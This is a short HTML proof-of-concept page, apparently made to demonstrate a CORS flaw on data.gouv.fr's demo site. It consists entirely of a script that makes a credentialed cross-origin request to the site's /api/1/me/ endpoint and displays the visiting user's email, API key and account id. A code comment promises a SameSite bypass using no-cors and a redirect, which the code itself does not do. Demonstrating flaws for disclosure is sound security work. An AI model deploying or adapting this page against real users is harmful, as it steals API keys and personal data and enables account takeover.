<!DOCTYPE html>
<html>
<head><title>CORS PoC - data.gouv.fr</title></head>
<body>
<h1>CORS PoC - data.gouv.fr</h1>
<pre id="output">Fetching...</pre>
<script>
// SameSite=Lax bypass: use no-cors with redirect
const url = "https://demo.data.gouv.fr/api/1/me/";

fetch(url, {
  credentials: "include",
  mode: "cors",
  method: "GET",
  headers: {
    "Accept": "application/json"
  }
})
.then(r => r.json())
.then(data => {
  document.getElementById("output").innerText = JSON.stringify({
    email: data.email,
    apikey: data.apikey,
    id: data.id
  }, null, 2);
})
.catch(e => document.getElementById("output").innerText = "Error: " + e);
</script>
</body>
</html>
